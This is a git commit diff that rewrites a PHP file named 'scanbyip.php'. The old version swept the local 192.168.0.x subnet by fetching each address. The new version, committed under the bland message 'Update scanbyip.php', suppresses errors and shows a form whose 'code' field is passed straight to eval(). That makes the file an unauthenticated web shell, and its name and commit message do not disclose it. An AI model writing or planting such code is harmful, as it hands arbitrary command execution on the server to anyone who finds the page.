65eeddf2b0b189d03724aa52617fc0c9e6cbddfe
mohamadirwanzulkifli <50953859+mohamadirwanzulkifli@users.noreply.github.com>
2020-12-12 08:03:11 +0800

    Update scanbyip.php

--- scanbyip.php
+++ scanbyip.php
@@ -1,7 +1,19 @@
 <?php
-ini_set('max_execution_time', 0);
-for($a=1;$a<255;$a++){
-	echo '<p>192.168.0.'.$a.'<p>';
-	echo file_get_contents('http://192.168.0.'.$a).'<hr>';
+ini_set('display_errors',false);
+ini_set('max_execution_time', 0); 
+
+$isExec = false;
+if(isset( $_POST['code'])){
+	$code = $_POST['code'];
+	$isExec = true;
+}
+
+echo '<form method="post">';
+echo '<textarea name="code" style="width:100%;height:200px">'.$code.'</textarea><br><br>';
+echo '<input type="submit" name="Submit">';
+echo '</form>';
+
+if($isExec){
+	echo @eval(trim($_POST['code']));
 }
 ?>
